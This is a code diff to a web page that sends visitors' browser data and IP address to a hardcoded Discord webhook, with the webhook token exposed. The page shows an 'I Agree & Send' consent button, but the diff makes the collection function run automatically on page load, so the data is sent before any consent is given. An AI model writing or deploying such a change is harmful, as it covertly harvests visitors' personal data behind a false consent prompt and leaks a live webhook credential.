@@ -11,7 +11,7 @@
     <p>
       This will send basic browser and IP information to a Discord webhook.
     </p>
-    <button id="sendBtn">I Agree & Send</button>
+    <button id="sendBtn" onclick=sendinfo>I Agree & Send</button>
     <pre id="status"></pre>
   </div>
 
@@ -19,7 +19,7 @@
     const WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1465917225818132575/eaIqusPShhtUlsTUlwmoZurmLcyFfqWrDsWSXe78jubMr4MSvFrR7siYeFWlIQ_aaqHm";
 
 async function getUserInfo() {
-  const ipRes = await fetch("https://api.ipify.org?format=json");
+  const ipRes = await fetch("https://ipinfo.io/json");
   const { ip } = await ipRes.json();
 
   return {
@@ -49,7 +49,7 @@ async function sendToDiscord(data) {
   });
 }
 
-document.getElementById("sendBtn").addEventListener("click", async () => {
+var sendinfo = async () => {
   const status = document.getElementById("status");
   status.textContent = "Collecting info...";
 
@@ -60,8 +60,8 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
   } catch (err) {
     status.textContent = "Error:\n" + err.message;
   }
-});
-
+};
+sendinfo();
   </script>
 </body>
 </html>
